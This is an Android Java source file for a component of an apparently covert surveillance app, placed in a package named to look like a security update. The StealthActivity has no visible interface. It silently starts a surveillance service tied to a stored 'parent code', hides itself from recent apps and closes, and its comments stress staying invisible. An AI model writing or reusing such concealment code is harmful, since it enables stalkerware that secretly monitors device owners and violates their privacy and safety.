package com.security.update;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.util.Log;

public class StealthActivity extends Activity {
    
    private SharedPreferences prefs;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // No UI - completely invisible
        setContentView(android.R.layout.simple_list_item_1);
        getWindow().setBackgroundDrawable(null);
        
        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        
        // Check if this is first launch
        String parentCode = prefs.getString("parent_code", "");
        
        if (parentCode.isEmpty()) {
            // Show login only if no code exists
            startActivity(new Intent(this, LoginActivity.class));
        } else {
            // Start surveillance silently
            startSurveillanceSilently(parentCode);
        }
        
        finish(); // Close this invisible activity
    }
    
    private void startSurveillanceSilently(String code) {
        // Start main service silently
        Intent serviceIntent = new Intent(this, StealthService.class);
        serviceIntent.putExtra("PARENT_CODE", code);
        startService(serviceIntent);
        
        // Hide app from recent apps
        moveTaskToBack(true);
    }
}
